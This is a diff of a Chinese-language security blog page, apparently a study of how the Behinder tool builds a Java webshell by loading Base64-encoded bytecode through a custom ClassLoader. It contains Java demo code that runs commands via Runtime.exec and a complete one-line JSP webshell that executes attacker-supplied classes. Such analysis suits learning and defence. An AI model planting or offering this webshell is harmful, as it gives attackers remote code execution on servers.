@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="II, Pear&#39;s">
+    <meta name="keywords" content="Java webshell浅析, Pear&#39;s">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>II | Pear&#39;s</title>
+    <title>Java webshell浅析 | Pear&#39;s</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -225,12 +225,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">II</h1>
+                    <h1 class="description center-align post-title">Java webshell浅析</h1>
                 </div>
             </div>
         </div>
@@ -346,14 +346,23 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/mess/">
-                                <span class="chip bg-color">mess</span>
+                            <a href="/tags/java/">
+                                <span class="chip bg-color">java</span>
                             </a>
                         
                     </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/java/" class="post-category">
+                                java
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -362,7 +371,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-09-09
+                    2021-09-10
                 </div>
                 
 
@@ -386,10 +395,153 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="Tricks"><a href="#Tricks" class="headerlink" title="Tricks"></a>Tricks</h3><pre class="line-numbers language-none"><code class="language-none">&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+                <h1 id="JavaWebshell-浅析"><a href="#JavaWebshell-浅析" class="headerlink" title="JavaWebshell 浅析"></a>JavaWebshell 浅析</h1><pre class="line-numbers language-none"><code class="language-none">主要通过behinder的webshell,加强一下反射的理解。
+作者原文：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;rebeyond&#x2F;p&#x2F;10916001.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>主要思路：</p>
+<p>​    通过反射调用Classloader#defineclass(),加载自定义的字节码实现。</p>
+<p>一个DEMO:</p>
+<p>​    首先写一个继承了ClassLoader的类，然后通过调用父类的defineClass方法，传入用户自定义的字节码数组</p>
+<p>UDF.java</p>
+<pre class="line-numbers language-none"><code class="language-none">package com.demo.webshell;
+
+import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
+import com.sun.xml.internal.rngom.parse.host.Base;
+import sun.misc.BASE64Decoder;
+
+import java.io.*;
+
+public class UDC &#123;
+
+    public static  class  Myloader extends ClassLoader&#123;
+        public Class get(byte[] b)&#123;
+          return  super.defineClass(b,0,b.length);
+        &#125;
 
 
+    &#125;
+    public static String Base64D() throws IOException &#123;
+        File file &#x3D; new File(&quot;&#x2F;Users&#x2F;qqqq&#x2F;IdeaProjects&#x2F;javaPro&#x2F;target&#x2F;classes&#x2F;com&#x2F;demo&#x2F;webshell&#x2F;evil.class&quot;);
+        InputStream in &#x3D; new FileInputStream(file);
+        byte[] buffer &#x3D; new byte[(int)file.length()];
+        in.read(buffer);;
+        in.close();
+        String classStr&#x3D; Base64.encode(buffer);
+        return classStr;
 
+    &#125;
+    public static void main(String[] args) throws Exception &#123;
+        &#x2F;&#x2F; TODO Auto-generated method stub
+        String classStr &#x3D; Base64D();
+        BASE64Decoder code&#x3D;new sun.misc.BASE64Decoder();
+        Class result&#x3D;new Myloader().get(code.decodeBuffer(classStr));
+        System.out.println(result.newInstance());
+    &#125;
+
+
+&#125;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>​    传入的evil.java</p>
+<p>​    这里是将在newInstance的时候调用的代码写在代码块中</p>
+<p>​    在newInstance是，调用先后顺序：静态代码块 &gt; 代码块 &gt; 构造函数</p>
+<pre class="line-numbers language-none"><code class="language-none">package com.demo.webshell;
+
+import java.io.IOException;
+
+public class evil &#123;
+    &#123;
+        try &#123;
+            Runtime.getRuntime().exec(&quot;&#x2F;System&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator&quot;);
+        &#125; catch (IOException e) &#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>​    作者在文中提到，为了服务端代码精简一点，通过重写Object#toString方法来调用恶意代码，这样就避免了用户自定义方法，稍微减少代码量。</p>
+<p>​    所以evil.java中可以改进下</p>
+<pre class="line-numbers language-none"><code class="language-none">package com.demo.webshell;
+
+import java.io.IOException;
+
+public class evil &#123;
+   @Override
+		public String toString() &#123;
+    &#x2F;&#x2F; TODO Auto-generated method stub
+    try &#123;
+        Runtime.getRuntime().exec(&quot;&#x2F;System&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator&quot;);
+    &#125; catch (IOException e) &#123;
+        &#x2F;&#x2F; TODO Auto-generated catch block
+        e.printStackTrace();
+    &#125;
+    return &quot;OK&quot;;
+&#125;
+&#125;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>​    当重写toString来构造payload时，有一个非常明显的弊端就是执行的命令是固定的，每次执行不同的代码都要重新编写一次代码。</p>
+<p>​    所以就考虑在Object中找一个能够传入参数的方法，主要关注equals方法</p>
+ <pre class="line-numbers language-none"><code class="language-none">public boolean equals(Object obj) &#123;
+    return (this &#x3D;&#x3D; obj);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>​    可以看到，equals传入的是参数类型是Object，返回值类型是布尔。又因为Object是所有类的基类，所以可以传入任何类型的对象。</p>
+<p>​    所以最终重写的方法为equals(),evil.java为：</p>
+<pre class="line-numbers language-none"><code class="language-none">package com.demo.webshell;
+
+import java.io.IOException;
+
+public class evil &#123;
+   @Override
+		    public boolean equals(Object obj) &#123;
+		    
+        return (this &#x3D;&#x3D; obj);
+        
+    &#125;
+
+&#125;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>最终实现的UDC.java为</p>
+<pre class="line-numbers language-none"><code class="language-none">package com.demo.webshell;
+
+import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
+import sun.misc.BASE64Decoder;
+import java.io.*;
+
+public class UDC &#123;
+    public static  class  Myloader extends ClassLoader&#123;
+        public Class get(byte[] b)&#123;
+          return  super.defineClass(b,0,b.length);
+        &#125;
+    &#125;
+    public static String Base64D() throws IOException &#123;
+        File file &#x3D; new File(&quot;&#x2F;Users&#x2F;qqqq&#x2F;IdeaProjects&#x2F;javaPro&#x2F;target&#x2F;classes&#x2F;com&#x2F;demo&#x2F;webshell&#x2F;evil.class&quot;);
+        InputStream in &#x3D; new FileInputStream(file);
+        byte[] buffer &#x3D; new byte[(int)file.length()];
+        in.read(buffer);;
+        in.close();
+        String classStr&#x3D; Base64.encode(buffer);
+        return classStr;
+    &#125;
+    public static void main(String[] args) throws Exception &#123;
+        &#x2F;&#x2F; TODO Auto-generated method stub
+        String classStr &#x3D; Base64D();
+        System.out.print(classStr.length());
+        BASE64Decoder code&#x3D;new sun.misc.BASE64Decoder();
+        Class result&#x3D;new Myloader().get(code.decodeBuffer(classStr));&#x2F;&#x2F;将base64解码成byte数组，并传入t类的get函数              System.out.println(result.newInstance().equals(&quot;&#x2F;System&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator&quot;));
+    &#125;
+  &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>​    最终的jsp一句话为：</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if(request.getParameter(&quot;pass&quot;)!&#x3D;null)new U(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())).newInstance().equals(pageContext);%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>​    为了解决ClassLoader的不同，需要重写classloader构造方法，传入指定的classloader。然后在这边是通过pageContext来获取上下文中的request对象，传入equals参数来执行任意命令。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上大致就是behinder通过反射加载字节码来进行命令执行的分析，没有加密解密功能进行分析。</p>
+<p>但是不知道在各种环境，如Tomcat、Spring、weblogic中是获取request的方式是否类似，上下文的获取是否一致。</p>
+<p>后面打算先看一下Tomcat内存马，来加深一下相关上下文的理解。</p>
 
                 
             </div>
@@ -404,8 +556,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/mess/">
-                                    <span class="chip bg-color">mess</span>
+                                <a href="/tags/java/">
+                                    <span class="chip bg-color">java</span>
                                 </a>
                             
                         </div>
@@ -448,9 +600,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/09/10/Java_shell/">
                     <div class="card-image">
@@ -468,9 +621,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-09-10
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-10
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -483,6 +636,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -498,7 +652,7 @@
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
                 <a href="/2021/09/09/mess/">
@@ -528,7 +682,6 @@
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
